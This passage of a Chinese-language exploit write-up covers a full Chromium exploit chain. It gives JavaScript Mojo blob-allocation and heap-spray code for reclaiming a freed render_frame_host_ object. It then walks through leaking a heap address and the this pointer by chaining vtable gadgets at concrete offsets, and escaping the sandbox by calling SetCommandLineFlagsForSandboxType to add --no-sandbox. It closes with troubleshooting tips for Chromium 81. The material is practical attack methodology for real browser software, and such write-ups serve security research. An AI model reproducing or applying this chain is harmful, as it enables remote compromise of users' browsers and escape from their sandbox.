@@ -1,0 +1,95 @@
+              }
+              this.pipe = Mojo.createDataPipe({
+                elementNumBytes: size, capacityNumBytes: size});
+              this.progressClient = new ProgressClient(this);
+              blob_registry_ptr.registerFromStream(
+                "", "", size, this.pipe.consumer, 
+                this.progressClient.ptr).then((res) => {
+                this.serialized_blob = res.blob;
+              })
+              this.malloc = async function(data) {
+                promise = new Promise((resolve, reject) => {
+                  this.writePromise = {resolve: resolve, reject: reject};
+                });
+                this.pipe.producer.writeData(data);
+                this.pipe.producer.close();
+                written = await promise;
+                console.assert(written == data.byteLength);
+              }
+              this.free = async function() {
+                this.serialized_blob.blob.ptr.reset();
+                await sleep(1000);
+              }
+              this.read = function(offset, length) {
+                this.readpipe = Mojo.createDataPipe({
+                  elementNumBytes: 1, capacityNumBytes: length});
+                this.serialized_blob.blob.readRange(
+                  offset, length, this.readpipe.producer, null);
+                return new Promise((resolve) => {
+                  this.watcher = this
+                  .readpipe
+                  .consumer
+                  .watch({readable: true}, (r) => {
+                    result = new ArrayBuffer(length);
+                    this.readpipe.consumer.readData(result);
+                    this.watcher.cancel();
+                    resolve(result);
+                  });
+                });
+              }
+              this.readQword = async function(offset) {
+                let res = await this.read(offset, 8);
+                return (new DataView(res)).getBigUint64(0, true);
+              }
+              return this;
+            }
+            async function allocate(data) {
+              let allocation = 
+                new Allocation(data.byteLength);
+              await allocation.malloc(data);
+              return allocation;
+            }
+            return allocate;
+          }
+          //.....
+          let allocate = getAllocationConstructor();
+            function spray(data) {
+              return Promise
+              .all(Array(0x8)
+                .fill()
+                .map(() => allocate(data)));
+            }
+            // 释放
+            let ptr = await getFreedPtr();
+            // 回收
+            let sa  = await spray(spray_buff);
+            // 触发漏洞
+### 避免崩溃
+#### 堆地址泄露
+此时由于原本存放render_frame_host_对象的内存现在被blob所占用，所以当调用render_frame_host_对象虚函数GetProcess时就会去调用spray_buff中的元素值+0x48处，而spray_buff对应位置值为0x4141414141414141所以此时依然会触发崩溃
+所以此时需要填入相应的函数地址，保证在执行GetProcess与GetBrowserContest两个虚函数时不会发生崩溃，并在执行IsOffTheRecord时能够泄露堆地址。通过查找可以首先找到一个符合条件的函数ChromeMainDelegate::CreateContentClient，此函数会将this+8处地址返回给调用者，可以将此函数地址填入堆喷占位的数据中，在调用GetProcess与GetBrowserContext虚函数时就回去调用此函数。
+再查找到ChromeMainDelegate类虚表
+查看虚表得知ChromeMainDelegate::CreateContentClient函数地址存放在起虚表的0x70偏移处。
+而InstalledAppProviderImpl::FilterInstalledApps在调用虚函数GetProcess时会从内存中获取一个地址将其加0x48并在此处获取一个函数去执行，所以可以将ChromeMainDelegate虚表地址+(0x70-0x48)填入堆喷数据中，当InstalledAppProviderImpl::FilterInstalledApps去调用GetProcess时就会转入ChromeMainDelegate::CreateContentClient函数
+在ChromeMainDelegate::CreateContentClient函数执行后会将堆喷数据地址+8偏移处的地址读出并再读出该地址0xD0偏移处的地址并调用，此处对应GetBrowserContext虚函数调用。于是可以将ChromeMainDelegate虚表地址-(0xD0-0x70)填入堆喷数据中当GetBrowserContext被调用时会再次转入ChromeMainDelegate::CreateContentClient函数
+最后在调用虚函数IsOffTheRecord时需要找到一个可以泄露堆地址的函数填入相应位置，通过查找找到符合条件的虚函数content::WebContentsImpl::GetWakeLockContext，由于此函数还会将this指针填入堆地址+0x8偏移处，所以也可以为后续的this地址泄露提供方便。
+此函数会创建一块内存用作对象内存，并会将此内存地址写入this+0x10+0x650偏移处，也就是堆喷占位数据的0x660偏移处
+但要注意的是content::WebContentsImpl::GetWakeLockContext函数会先去判断this+0x10+0x650偏移处是否为0，如果为0才可以进行创建堆内存并写入this+0x10+0x650的操作
+通过以上操作，在经过`render_frame_host_->GetProcess()->GetBrowserContext()->IsOffTheRecord()`后就可以在堆喷占位数据的0x660偏移处得到一个需要的堆地址
+#### this地址泄露
+由于在上一步操作中已经泄露了堆地址并且还将this指针写入了堆地址+0x8偏移处，所以可以利用前面泄露堆地址的思路将UAF漏洞再触发一次，并把之前拿到的泄露的堆地址写入堆喷占位数据的对应偏移处即可获取到this指针，由于前面的漏洞利用this指针正好指向我们可控的堆喷占位数据，拿到了this地址也就得到了当前可控数据的地址。继续将ChromeMainDelegate::CreateContentClient函数放入GetProcess与GetBrowserContext函数对应的调用位置，现在只需要再找到一个符合条件可以将this指针从堆地址中获取到的函数，通过查找找到`anonymous
+namespace'::DictionaryIterator::Start`函数正好符合要求。
+结合调试再通过与泄露堆地址一样再次触发UAF漏洞便可得到this指针
+### 沙盒逃逸
+沙河逃逸的思路比较简单，通过回调去执行SetCommandLineFlagsForSandboxType函数将--no-sandbox参数添加到current_process_commandline_中。首先需要找到一个可以调用回调函数的虚函数，通过查找找到content::responsiveness::MessageLoopObserver::DidProcessTask函数
+现在再找到一个可以传递多个参数的回调函数，类似如下形式的
+然后将SetCommandLineFlagsForSandboxType函数地址填入被泄露了地址的buffer的相应偏移处就可以将沙箱关闭，但调用SetCommandLineFlagsForSandboxType函数还需要先得到全局变量current_process_commandline_
+通过extensions::SizeConstraints::set_minimum_size函数将current_process_commandline_中保存的指针拷贝进前文中已经被泄露地址的可控地址中。
+最后调用SetCommandLineFlagsForSandboxType函数，将--no-sandbox(0)标志添加进全局变量current_process_commandline_中
+最后生成新的渲染器过程（例如，使用iframe到其他受控原点或开启新的Tab），并再次使用渲染器漏洞利用(刷新)即可成功。
+## 总结
+  * 21224漏洞触发后在触发1062091前浏览器就产生崩溃——手动delete清理掉oob数组
+  * 在开启mojo时修改RenderFrameImpl对象相应变量导致页面崩溃——21224中构造的读写原语在循环体中同时频繁读写会导致此问题，去掉部分不必要的读或写操作
+  * 将相应成员变量值写入对应的RenderFrameImpl对象偏移后mojo依然没有开启——在 81.0.4044.0版本chromium中在写入enabled_bindings_时需要将g_frame_map中拿到的RenderFrameImpl对象地址加0x68再加enabled_bindings_所在偏移，而IsMainFrame中用到的成员变量就在g_frame_map中拿到的RenderFrameImpl对象的0x88偏移处。
+  * 原POC中用到的MojoInterfaceInterceptor需要开启MojoJSTest绑定才能使用——使用其他方法传递sub frame中的句柄给main frame，例如在sub frame的onload事件中使用contentWindow获取其句柄再传递给main frame，但此方法直接在本地执行时会出现跨域的问题需要起一个服务器去访问执行。
+* * *
